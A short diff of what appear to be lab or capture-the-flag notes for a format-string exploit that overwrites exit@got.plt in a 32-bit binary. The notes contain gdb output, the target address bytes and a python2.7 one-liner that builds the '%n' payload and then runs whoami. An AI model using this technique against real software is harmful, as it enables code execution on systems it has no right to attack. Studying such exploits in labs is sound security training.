@@ -40,13 +40,13 @@ ffffd8aa_16 = 4294957226_10 > INT_MAX
 # 8048376:       68 18 00 00 00          push   0x18
 # 804837b:       e9 b0 ff ff ff          jmp    8048330 <_init+0x38>
 
+0x80497e0                   --> \xe0\x97\x04\x08
+0x80497e0 + 2 = 0x80497e2   --> \xe2\x97\x04\x08
+
 (gdb) x/xw 0x80497e0
 0x80497e0 <exit@got.plt>:       0x08048376
 (gdb) x/xw 0x80497e2
 0x80497e2 <exit@got.plt+2>:     0x54200804
-
-0x80497e0                   --> \xe0\x97\x04\x08
-0x80497e0 + 2 = 0x80497e2   --> \xe2\x97\x04\x08
 
 python2.7 -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55458x" + "%10$n" + "%10069x" + "%11$n")' > /tmp/exploit.txt
 whoami
